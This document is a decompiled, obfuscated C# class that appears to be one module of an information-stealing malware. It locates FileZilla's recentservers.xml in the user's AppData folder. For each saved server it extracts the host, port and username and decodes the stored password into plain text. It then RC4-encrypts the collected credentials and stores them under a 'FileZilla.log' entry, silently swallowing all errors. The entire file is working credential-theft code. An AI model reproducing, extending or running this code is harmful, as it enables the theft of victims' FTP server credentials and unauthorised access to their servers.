using System;
using System.IO;
using System.Text;
using System.Xml;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000014 RID: 20
	internal class Class_13
	{
		// Token: 0x06000047 RID: 71 RVA: 0x00003DDE File Offset: 0x00001FDE
		public static void gmethod_33(string str_0)
		{
			if (File.Exists(Class_13.field_2))
			{
				Class_13.cmethod_34(Class_13.field_2, str_0 + "\\FileZilla\\FileZilla.log", "RecentServers", "Server");
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003E1C File Offset: 0x0000201C
		public static void cmethod_34(string str_0, string str_1, string str_2 = "RecentServers", string str_3 = "Server")
		{
			try
			{
				if (File.Exists(str_0))
				{
					try
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(str_0);
						foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName(str_2)[0]).GetElementsByTagName(str_3))
						{
							XmlElement xmlElement = (XmlElement)obj;
							string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
							string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
							string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
							string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
							if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3) || string.IsNullOrEmpty(@string))
							{
								break;
							}
							Class_13.field_1.AppendLine("Host: " + innerText);
							Class_13.field_1.AppendLine("Port: " + innerText2);
							Class_13.field_1.AppendLine("User: " + innerText3);
							Class_13.field_1.AppendLine("Pass: " + @string + "\r\n");
							Class_13.field_0++;
						}
						if (Class_13.field_1.Length > 0)
						{
							try
							{
								Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_1, Class_47.RC4(Encoding.UTF8.GetBytes(Class_13.field_1.ToString())));
								Class_13.field_1 = null;
							}
							catch
							{
							}
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000038 RID: 56
		public static int field_0;

		// Token: 0x04000039 RID: 57
		private static StringBuilder field_1 = new StringBuilder();

		// Token: 0x0400003A RID: 58
		public static readonly string field_2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
	}
}
